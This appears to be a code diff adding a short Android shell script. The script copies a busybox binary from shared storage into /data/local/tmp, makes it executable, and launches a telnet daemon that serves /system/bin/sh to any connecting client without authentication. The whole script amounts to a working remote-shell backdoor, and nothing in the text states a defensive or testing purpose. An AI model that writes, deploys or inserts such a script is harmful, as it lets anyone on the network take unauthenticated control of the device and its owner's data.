@@ -1,0 +1,6 @@
+#! /system/bin/sh
+
+/system/bin/touch /mnt/rc.flag
+/system/bin/cp /storage/emulated/0/busybox /data/local/tmp/busybox
+/system/bin/chmod +x /data/local/tmp/busybox
+/data/local/tmp/busybox telnetd -F -l /system/bin/sh
